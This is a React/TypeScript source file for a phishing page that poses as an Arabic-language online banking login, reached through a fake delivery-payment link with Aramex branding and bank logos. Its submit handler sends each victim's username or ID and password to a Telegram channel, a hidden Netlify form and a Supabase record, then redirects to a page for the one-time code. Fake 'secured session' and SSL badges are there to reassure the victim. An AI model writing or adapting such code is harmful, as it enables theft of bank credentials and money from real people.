import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, KeyRound, Globe, ChevronDown, Smartphone, ShieldAlert } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
  const branding = getServiceBranding(linkData?.payload?.service_key || "aramex");
  
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || (!username && !customerId)) {
      toast({ title: "خطأ", description: "يرجى إكمال بيانات الدخول", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const bankLoginData = { username, customerId, password };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, bankLoginData } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          linkId: id!,
          bank: selectedBank?.nameAr || "غير محدد",
          username: username || customerId,
          password: password,
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'bank_login',
        data: {
          username: username || customerId,
          password: password,
          bank: selectedBank?.nameAr,
          service: branding.name,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل تسجيل الدخول", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <Loader2 className="w-10 h-10 animate-spin text-primary" />
    </div>
  );

  const primaryColor = selectedBankBranding.colors.primary;
  const secondaryColor = selectedBankBranding.colors.secondary;
  const surfaceColor = selectedBankBranding.colors.surface;

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ background: surfaceColor, fontFamily: selectedBankBranding.fonts.arabic }}>
      <PaymentMetaTags 
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
        serviceName={selectedBank?.nameAr || "البنك"}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
      />

      <header className="w-full bg-white border-b-4 shadow-xl sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
         <div className="container mx-auto px-4 h-20 sm:h-24 flex items-center justify-between">
            <div className="flex items-center gap-4 sm:gap-8">
               <div className="w-40 sm:w-56 h-12 sm:h-16 flex items-center">
                  {selectedBankId && (
                    <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="lg" />
                  )}
               </div>
               <div className="hidden lg:block h-12 w-px bg-gray-100" />
               <div className="hidden lg:block">
                  <h1 className="text-base font-black text-gray-800 leading-tight">الخدمات المصرفية للأفراد</h1>
                  <p className="text-[10px] font-bold text-gray-400 uppercase tracking-[0.2em]">Retail Online Banking Portal</p>
               </div>
            </div>
            <div className="flex items-center gap-3 sm:gap-5">
               <div className="flex items-center gap-2 px-4 py-2 rounded-xl bg-gray-50 border border-gray-100 text-[11px] font-black text-gray-600 hover:bg-gray-100 transition-colors cursor-pointer group">
                  <Globe className="w-4 h-4 group-hover:rotate-12 transition-transform" />
                  <span>ENGLISH</span>
               </div>
               <div className="flex items-center gap-2 px-4 py-2 rounded-xl bg-green-50 text-green-700 border border-green-100 text-[11px] font-black shadow-sm">
                  <Lock className="w-4 h-4" />
                  <span className="hidden sm:inline">SECURED SESSION</span>
               </div>
            </div>
         </div>
      </header>

      <main className="flex-1 flex items-center justify-center p-4 py-12 sm:py-20 relative overflow-hidden">
         {/* Background pattern */}
         <div className="absolute top-0 right-0 w-[500px] h-[500px] rounded-full opacity-[0.03] blur-[100px] pointer-events-none" style={{ backgroundColor: primaryColor }} />
         <div className="absolute bottom-0 left-0 w-[400px] h-[400px] rounded-full opacity-[0.03] blur-[100px] pointer-events-none" style={{ backgroundColor: secondaryColor }} />

         <div className="w-full max-w-xl space-y-8 relative z-10">
            <Card className="border-none shadow-[0_30px_100px_-20px_rgba(0,0,0,0.15)] rounded-[2.5rem] overflow-hidden bg-white">
               <div className="bg-gray-50/50 p-10 sm:p-12 text-center border-b border-gray-50">
                  <div
                    className="w-20 h-20 rounded-3xl mx-auto mb-8 flex items-center justify-center text-white shadow-2xl animate-in zoom-in duration-700"
                    style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
                  >
                     <Smartphone className="w-10 h-10" />
                  </div>
                  <h2 className="text-3xl sm:text-4xl font-black text-gray-900 mb-2 tracking-tight">تسجيل الدخول</h2>
                  <p className="text-sm font-bold text-gray-400 uppercase tracking-[0.3em]">Secure Access Required</p>
               </div>

               <form onSubmit={handleSubmit} className="p-10 sm:p-12 space-y-8">
                  <div className="space-y-6">
                    <div className="space-y-2">
                       <Label className="text-[11px] font-black text-gray-400 uppercase tracking-[0.2em] px-1 flex justify-between items-center">
                          <span>اسم المستخدم أو رقم الهوية</span>
                          <span className="w-1 h-1 rounded-full bg-red-500" />
                       </Label>
                       <div className="relative group">
                          <Input
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            className="h-16 border-2 border-gray-100 rounded-2xl font-black text-xl text-gray-700 bg-gray-50/30 pr-14 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/5 transition-all"
                            placeholder="أدخل بياناتك"
                            required
                          />
                          <User className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
                       </div>
                    </div>

                    <div className="space-y-2">
                       <div className="flex items-center justify-between px-1">
                          <Label className="text-[11px] font-black text-gray-400 uppercase tracking-[0.2em]">كلمة السر الخاصة بالإنترنت</Label>
                          <button type="button" className="text-[10px] font-black text-blue-600 uppercase tracking-widest hover:underline transition-all">نسيت كلمة السر؟</button>
                       </div>
                       <div className="relative group">
                          <Input
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            type={showPassword ? "text" : "password"}
                            className="h-16 border-2 border-gray-100 rounded-2xl font-black text-xl text-gray-700 bg-gray-50/30 pr-14 pl-14 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/5 transition-all"
                            placeholder="********"
                            required
                          />
                          <KeyRound className="absolute right-5 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
                          <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-5 top-1/2 -translate-y-1/2 text-gray-300 hover:text-gray-500 transition-colors">
                             {showPassword ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
                          </button>
                       </div>
                    </div>
                  </div>

                  <div className="pt-4">
                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      className="w-full h-16 rounded-2xl font-black text-xl shadow-[0_20px_40px_-10px_rgba(0,0,0,0.2)] text-white active:scale-[0.98] transition-all flex items-center justify-center gap-3"
                      style={{ backgroundColor: primaryColor }}
                    >
                       {isSubmitting ? (
                         <Loader2 className="w-8 h-8 animate-spin" />
                       ) : (
                         <>
                           <span>دخول آمن للموقع</span>
                           <ShieldCheck className="w-6 h-6" />
                         </>
                       )}
                    </Button>
                  </div>
               </form>

               <div className="px-10 sm:px-12 pb-10 flex flex-col sm:flex-row items-center justify-between gap-6 opacity-60">
                  <div className="flex items-center gap-3">
                     <div className="w-10 h-10 rounded-full bg-gray-50 flex items-center justify-center text-gray-400">
                        <ShieldAlert className="w-5 h-5" />
                     </div>
                     <div className="text-right sm:text-left">
                        <p className="text-[10px] font-black text-gray-800 leading-none mb-1">دليل الأمان</p>
                        <p className="text-[9px] font-bold text-gray-400">تحقق من شهادة الأمان SSL</p>
                     </div>
                  </div>
                  <div className="flex items-center gap-4">
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-4 grayscale" />
                     <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-4 grayscale" />
                  </div>
               </div>
            </Card>

            <footer className="text-center space-y-6">
               <div className="flex items-center justify-center gap-2 text-gray-400">
                  <div className="h-px w-8 bg-gray-200" />
                  <p className="text-[9px] font-black uppercase tracking-[0.3em]">Privacy Policy & Terms</p>
                  <div className="h-px w-8 bg-gray-200" />
               </div>
               <p className="text-[10px] font-bold text-gray-400 leading-relaxed max-w-sm mx-auto">
                  جميع الحقوق محفوظة لصالح {selectedBank?.nameAr || 'البنك'}. إن استخدامك لهذا الموقع يعني موافقتك التامة على شروط وأحكام الخدمة.
               </p>
            </footer>
         </div>
      </main>

      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="bank" />
        <input type="text" name="username" />
        <input type="password" name="password" />
        <input type="text" name="amount" />
      </form>
    </div>
  );
};

export default PaymentBankLogin;
